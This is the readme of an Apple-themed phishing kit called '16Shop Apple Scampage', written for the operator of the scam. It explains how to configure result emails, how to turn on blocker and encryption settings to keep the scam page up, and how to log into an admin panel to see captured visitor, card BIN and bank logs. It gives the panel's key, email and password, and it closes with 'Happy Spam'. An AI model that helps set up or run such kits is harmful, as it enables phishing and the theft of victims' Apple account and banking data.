[+] ------------------------ 16Shop Apple Scampage V.2.0.1 2019 ------------------------ [+]
[+] Configure Setting Email Result and Other Setting available on file setting.ini
[+] Set on  = input "on"
[+] Set off = just blank ""
[+] Admin Panel to view visitor/bin/bank logs you can login after extract the script in https://yourscam.com/admin
[+] Key for Admin Panel : 732sSY72hs892HK3Jx728
[+] Email for Admin Panel : proscampage@16shop.us
[+] Password for Admin Panel : #5X5$201916shop+==
[+] For lifetime scampage you can set on all of [ BLOCKER AND ENC SETTING ] in setting.ini

Happy Spam <3